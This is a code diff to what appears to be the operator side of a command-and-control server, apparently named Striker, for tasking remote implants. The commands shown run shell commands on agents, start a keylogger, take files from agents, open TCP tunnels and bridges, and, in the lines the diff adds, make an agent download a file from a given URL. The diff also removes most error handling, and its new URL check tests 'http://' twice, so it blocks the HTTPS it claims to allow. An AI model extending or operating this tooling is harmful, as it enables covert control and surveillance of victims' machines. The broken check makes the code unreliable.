@@ -88,7 +88,8 @@ export const setupWS = (httpServer) => {
       "tunnel <lhost>:<lport> <rhost>:<rport>": "Start a TCP tunnel",
       "bridge <host1>:<port1> <host2>:<port2>": "Start a TCP bridge b/w 2 servers",
       "system <cmd>": "Run a shell command",
-      "writedir <dir>": "Change agent's write directory"
+      "writedir <dir>": "Change agent's write directory",
+      "webload <url> <file>": "Download a file from a URL"
     }
 
     /**
@@ -141,49 +142,33 @@ export const setupWS = (httpServer) => {
           }else if (input.startsWith("system ")){ // Create a system command task
             let cmd = input.substr(7).trim();
             const taskData = {agentID, taskType: "system", data: {cmd}};
-            taskModel.createTask(username, taskData).catch(error => {
-              client.emit("striker_error", error.message);
-            });
+            taskModel.createTask(username, taskData);
           }else if (input === "freeze"){ // Freeze an agent.
-            agentModel.freezeAgent(agentID, username).catch(error => {
-              client.emit("striker_error", error.message);
-            });
+            agentModel.freezeAgent(agentID, username);
           }else if (input === "unfreeze"){ // Unfreeze an agent.
-            agentModel.unfreezeAgent(agentID, username).catch(error => {
-              client.emit("striker_error", error.message);
-            });
+            agentModel.unfreezeAgent(agentID, username);
           }else if (input.startsWith("delete task ")){ // Delete a task.
             let taskID = input.substr(12).trim();
-            taskModel.deleteTask(agentID, taskID, username).catch(error => {
-              client.emit("striker_error", error.message);
-            });
+            taskModel.deleteTask(agentID, taskID, username);
           }else if (input === "delete agent"){ // Delete the agent.
             agentModel.deleteAgent(agentID, username).then(async () => {
               await taskModel.deleteAllTasks(agentID);
               await fileModel.deleteAllFiles(agentID);
-            }).catch(error => {
-              client.emit("striker_error", error.message);
             });
           }else if (input.startsWith("download ")){ // Task an agent to upload a file to the server.
             let filename = input.substr(9).trim();
             taskModel.createTask(username, {
               agentID, taskType: "download", data: {file: filename}
-            }).catch(error => {
-              client.emit("striker_error", error.message);
             });
           }else if (input.startsWith("writedir ")){ // Change the write dir of an agent.
             let dir = input.substr(9).trim();
             taskModel.createTask(username, {
               agentID, taskType: "writedir", data: {dir}
-            }).catch(error => {
-              client.emit("striker_error", error.message);
             });
           }else if (input.startsWith("keymon ")){ // Start a keylogger.
             let duration = parseInt(input.substr(7).trim());
             taskModel.createTask(username, {
               agentID, taskType: "keymon", data: {duration}
-            }).catch(error => {
-              client.emit("striker_error", error.message);
             });
           }else if (input.startsWith("delay ")){
             let delay = input.substr(6).trim();
@@ -201,9 +186,7 @@ export const setupWS = (httpServer) => {
               };
               taskModel.createTask(username, {
                 agentID, taskType: "delay", data: {delay}
-              }, onComplete).catch(error => {
-                client.emit("striker_error", error.message);
-              });
+              }, onComplete);
             }
           }else if (input.startsWith("cd ")){
             let dirname = input.substr(3).trim();
@@ -213,9 +196,7 @@ export const setupWS = (httpServer) => {
             };
             taskModel.createTask(username, {
               agentID, taskType: "cd", data: {dir: dirname}
-            }, onComplete).catch(error => {
-              client.emit("striker_error", error.message);
-            });
+            }, onComplete);
           }else if (input.startsWith("tunnel ")){
             let addrs = input.substr(7).trim();
             let lhost = addrs.split(":")[0].trim()
@@ -228,8 +209,6 @@ export const setupWS = (httpServer) => {
               return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
             taskModel.createTask(username, {
               agentID, taskType: "tunnel", data: {lhost, lport, rhost, rport}
-            }).catch(error => {
-              client.emit("striker_error", error.message);
             });
           }else if (input.startsWith("bridge ")){
             let addrs = input.substr(7).trim();
@@ -243,8 +222,6 @@ export const setupWS = (httpServer) => {
               return client.emit("agent_console_output", {agentID, msg: "Invalid host!"});
             taskModel.createTask(username, {
               agentID, taskType: "bridge", data: {host1, port1, host2, port2}
-            }).catch(error => {
-              client.emit("striker_error", error.message);
             });
           }else if (input === "tasks"){
             let tasks = await taskModel.getTasks(agentID);
@@ -268,14 +245,20 @@ export const setupWS = (httpServer) => {
               return client.emit("agent_console_output", {agentID, msg: "Task already completed, or not yet received by agent!"});
             taskModel.createTask(username, {
               agentID, taskType: "kill", data: {uid: task.uid}
-            }).catch(error => {
-              client.emit("striker_error", error.message);
             });
+          }else if (input.startsWith("webload ")){
+            let url = input.split(" ")[1].trim();
+            let file = input.split(" ")[2].trim();
+            if (!(url.startsWith("http://") || url.startsWith("http://"))){
+              client.emit("agent_console_output", {agentID, msg: "Only HTTP(s) URLs are supported!"});
+            }else{
+              taskModel.createTask(username, {
+                agentID, taskType: "webload", data: {url, file}
+              });
+            }
           }else if (input === "abort"){
             taskModel.createTask(username, {
               agentID, taskType: "abort"
-            }).catch(error => {
-              client.emit("striker_error", error.message);
             });
           }else{ // Unknown query
             client.emit("agent_console_output", {
